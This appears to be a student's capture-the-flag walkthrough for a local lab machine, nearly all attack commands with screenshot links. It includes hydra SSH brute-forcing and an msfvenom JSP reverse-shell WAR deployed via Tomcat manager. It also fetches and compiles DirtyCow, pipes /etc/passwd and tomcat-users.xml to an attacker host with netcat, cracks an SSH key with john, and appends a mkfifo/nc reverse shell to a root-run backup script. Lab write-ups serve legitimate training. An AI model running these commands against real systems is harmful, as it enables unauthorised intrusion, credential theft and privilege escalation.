# Telmora 192.168.56.100
# Andrea Zonnekus 18758119

sudo netdiscover -i eth0

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.001.png)

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.002.png)

sudo nmap -sV -sT -Pn -O 192.168.56.100 192.168.56.109 -oN os

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.003.png)



auxiliary/scanner/ssh/ssh\_enumusers

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.004.png)

locate pass | grep ssh

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.005.png)

hydra -L ssh\_users -P /usr/share/legion/wordlists/ssh-betterdefaultpasslist.txt ssh://192.168.56.109 -m ssh -e nsr

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.006.png)



dirb <http://192.168.56.109:8080>

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.007.png)


nikto -host http://192.168.56.109:8080 -Format text -o nikto

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.008.png)

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.009.png)

note file location

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.010.png)



auxiliary/scanner/http/tomcat\_mgr\_login

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.011.png)

note hostname, os version, arch, kernel – lines up with the nmap guess

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.012.png)

msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=192.168.56.101 LPORT=4444 -f war > shell.war

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.013.png)

ofcourse, nc -lvp 4444

undeploy current war

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.014.png)

redeploy ours & navigate to the shell

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.015.png)



ping our host

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.016.png)

sudo cp firefart\_dirtycow.c /var/www

python -m http.server 80

wget 192.168.56.101/firefart\_dirtycow.c

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.017.png)

python3 -c 'import pty; pty.spawn("/bin/bash")'

tty

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.018.png)

ls /etc

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.019.png)



nc -lvp 4444 > passwd

nc 192.168.56.101 4444 < /etc/passwd

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.020.png)


(file found before)

nc -lvp 4444 > tomcat\_users.xml

locate tomcat-users.xml

nc 192.168.56.101 4444 < /opt/tomcat/apache-tomcat-9.0.52/conf/tomcat-users.xml

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.021.png)



realise I need to actually compile the binaries

sudo gcc firefart\_dirtycow.c -o dirty32 -pthread

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.022.png)

chmod 777 dirty32

ls -lah | grep dirty32

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.023.png)


nc -lvp 44444 > id\_rsa

nc -lvp 44444 > id\_rsa.pub

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.024.png)

locate /usr/share/john/ssh2john.py

python /usr/share/john/ssh2john.py id\_rsa > decrypted

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.025.png)

locate rockyou

sudo john decrypted.hash --wordlist=/usr/share/wordlists/rockyou.txt

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.026.png)

su thales

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.027.png)

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.028.png)



ls

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.029.png)

echo "rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.101 7777 >/tmp/f" >> backup.sh

tail backup.sh

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.030.png)

wait on port 7777

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.031.png)



cat root.txt

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.032.png)

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.033.png)

john passwd shadow --wordlist=/usr/share/wordlists/rockyou.txt

![](thales_steps/Aspose.Words.15d198b7-4908-4e03-b7e0-21071e5a5ccb.034.png)
